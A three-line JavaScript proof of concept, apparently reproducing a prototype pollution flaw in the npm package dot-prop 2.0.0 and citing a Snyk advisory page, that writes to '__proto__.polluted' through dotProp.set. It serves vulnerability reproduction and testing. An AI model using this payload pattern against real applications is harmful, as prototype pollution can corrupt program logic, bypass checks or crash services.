//https://snyk.io/test/npm/dot-prop/2.0.0
const dotProp = require("dot-prop");
dotProp.set({}, "__proto__.polluted", "yes");
